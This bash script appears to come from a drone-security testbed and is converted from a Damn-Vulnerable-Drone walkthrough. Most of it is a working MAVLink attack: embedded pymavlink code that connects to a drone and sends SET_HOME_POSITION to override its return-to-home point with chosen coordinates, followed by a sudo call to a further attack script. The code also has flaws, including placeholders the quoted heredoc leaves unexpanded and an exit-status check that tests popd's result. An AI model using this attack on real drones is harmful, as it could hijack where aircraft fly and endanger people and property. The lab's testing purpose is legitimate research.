#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Return-to-Home-Point-Override.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition
# This block dynamically queries the MTD interface for an active target.
# ==========================================================
echo "INFO: Querying MTD interface for active target..."

# --- Project Root Resolution ---
# 1. 현재 실행되는 쉘 스크립트의 실제 위치를 찾습니다.
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
# 2. 'dvd_lite' 폴더를 포함하는 프로젝트 루트 디렉토리를 찾습니다. (현재 위치에서 4단계 위)
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")
# -----------------------------

# PYTHONPATH 환경 변수 대신, 직접 프로젝트 루트로 이동하여 파이썬 모듈을 실행합니다.
# 이 방식은 'sudo'가 환경 변수를 초기화하는 문제를 우회할 수 있어 더 안정적입니다.
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
popd > /dev/null

if [ $? -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

# 콜론을 기준으로 IP와 PORT를 분리하여 변수에 저장합니다.
TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

echo "INFO: Active target acquired -> ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=return-to-home-point-override src=Return-to-Home-Point-Override.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil

# Replace with your connection string (e.g., tcp:${TARGET_IP}:${TARGET_PORT})
connection_string = 'udp:${TARGET_IP}:${TARGET_PORT}'

# Connect to the vehicle
master = mavutil.mavlink_connection(connection_string)
master.wait_heartbeat()
print("[+] Connected to drone")

# Define the new home position (latitude, longitude, altitude)
latitude = -35.363261      # Degrees
longitude = 149.165230     # Degrees
altitude = 584             # Meters

# Convert to MAVLink-compatible format
lat = int(latitude * 1e7)
lon = int(longitude * 1e7)
alt = int(altitude * 1000)  # mm

# Send SET_HOME_POSITION command
master.mav.set_home_position_send(
    target_system=master.target_system,
    latitude=lat,
    longitude=lon,
    altitude=alt,
    x=0, y=0, z=0,           # Not used
    q=[0, 0, 0, 0],          # Orientation (ignored)
    approach_x=0,
    approach_y=0,
    approach_z=0
)

print(f"[!] New home set: lat={latitude}, lon={longitude}, alt={altitude}m")
PY

log "[BLOCK 2] type=shell"
sudo python3 set_home_override.py

